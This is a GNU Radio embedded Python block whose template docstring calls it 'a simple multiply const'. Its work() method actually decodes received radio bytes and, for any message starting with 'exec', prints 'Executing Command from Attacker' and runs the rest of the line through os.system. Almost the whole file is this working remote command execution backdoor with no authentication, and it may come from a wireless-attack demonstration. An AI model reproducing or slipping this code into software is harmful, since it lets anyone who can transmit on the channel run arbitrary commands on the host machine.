"""
Embedded Python Blocks:

Each time this file is saved, GRC will instantiate the first class it finds
to get ports and parameters of your block. The arguments to __init__  will
be the parameters. All of them are required to have default values!
"""

import numpy as np
from gnuradio import gr
import os
import time


class blk(gr.sync_block):  # other base classes are basic_block, decim_block, interp_block
    """Embedded Python Block example - a simple multiply const"""

    def __init__(self, example_param=1.0):  # only default arguments here
        """arguments to this function show up as parameters in GRC"""
        gr.sync_block.__init__(
            self,
            name='Embedded Python Block',   # will show up in GRC
            in_sig=[np.byte],
            out_sig=None
        )
        # if an attribute with the same name as a parameter is found,
        # a callback is registered (properties work, too).
        self.example_param = example_param

    def work(self, input_items, output_items):
        """Execute Comamand"""
        if len(input_items):
            out = input_items[0].tobytes()
            out = out.decode()
            #print(out, ' \n\n')
            if(out[0:4]=="exec"):
                print("\n--- Executing Command from Attacker ---\n")
                cmd = out.partition('\n')[0]
                cmd = cmd[4:]
                os.system(cmd)
            #time.sleep(2)                
            return len(input_items)
        else:
            return len(input_items)
